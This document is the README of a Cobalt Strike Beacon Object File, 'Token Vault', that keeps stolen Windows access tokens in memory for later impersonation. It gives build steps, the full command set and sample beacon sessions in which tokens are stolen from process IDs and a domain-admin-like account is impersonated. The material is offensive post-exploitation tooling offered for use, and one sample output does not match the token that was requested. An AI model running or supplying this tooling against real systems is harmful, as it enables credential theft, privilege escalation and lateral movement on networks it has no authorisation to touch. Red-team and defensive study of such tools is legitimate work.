# Token Vault BOF for Cobalt Strike

This Beacon Object File (BOF) creates in-memory storage for stolen/duplicated Windows access tokens, which allows you to:

- Hot swap/re-use already stolen tokens without re-duplicating.
- Store tokens for later use in case of a person log out.

## Installation

1. Clone the repository.
2. Build the BOF: `make all`.
3. Load the `token-vault.cna` aggressor script to your Cobalt Strike client.

## Usage

```
beacon> help token-vault
Available Commands:
	Create a new token vault:    token-vault create
	Steal and store tokens:      token-vault steal <comma separated list of PIDs> [vault-id]
	Use the stored token:        token-vault use <token-id> [vault-id]
	Show the stored tokens:      token-vault show [vault-id]
	Remove the stored token:     token-vault remove <token-id> [vault-id]
	Remove all tokens:           token-vault remove-all [vault-id]
	Set the default token vault: token-vault set <vault-id>
```

### Vault Creation

The `token-vault create` command allocates an empty vault from the beacon's heap. The received output contains the memory address of the vault (a.k.a. vault id), which is used to specify the vault for the other `token-vault` commands.

```
beacon> token-vault create
[*] Token Vault - create (@henkru)
[+] host called home, sent: 2991 bytes
[+] received output:
token vault created: 0000000000C31610
```

Additionally, a specific vault id can be set as a default vault which is used if a `token-vault` command does not include the vault id.

```
beacon> token-vault set 0000000000C31610
```

It is important to note that configured default vaults live inside the Cobalt Strike client and are not shared between clients.

### Steal token

The `token-vault steal` command duplicates the given processes' tokens and stores them in the vault.

```
beacon> token-vault steal 6600,2608,5248
[*] Token Vault - steal (@henkru)
[+] host called home, sent: 3009 bytes
[+] received output:
6600: WINLAB\limited
[+] received output:
2608: WINLAB\limited2
[+] received output:
5248: WINLAB\admin
```

### Show stored tokens

```
beacon> token-vault show
[*] Token Vault - show (@henkru)
[+] host called home, sent: 2999 bytes
[+] received output:
5248: WINLAB\admin
2608: WINLAB\limited2
6600: WINLAB\limited
```

### Use token

The `token-vault use` command impersonates a token from the vault. If the token does not exist, it will be stolen and stored in the vault.

```
beacon> token-vault use 2608
[*] Token Vault - use (@henkru)
[+] host called home, sent: 3001 bytes
[+] Impersonated WINLAB\limited
```

```
beacon> token-vault use 6384
[*] Token Vault - use (@henkru)
[+] host called home, sent: 3001 bytes
[-] token of 6384 not in the vault; try to get it.
[+] received output:
6384: WINLAB\da
[+] Impersonated WINLAB\da
```

### Remove token

The `token-vault remove` command removes a stored token from the vault.

```
beacon> token-vault remove 6600
[*] Token Vault - remove (@henkru)
[+] host called home, sent: 3001 bytes
[+] received output:
removed: 6600
```

Additionally, the `token-vault remove-all` command removes all tokens at once.
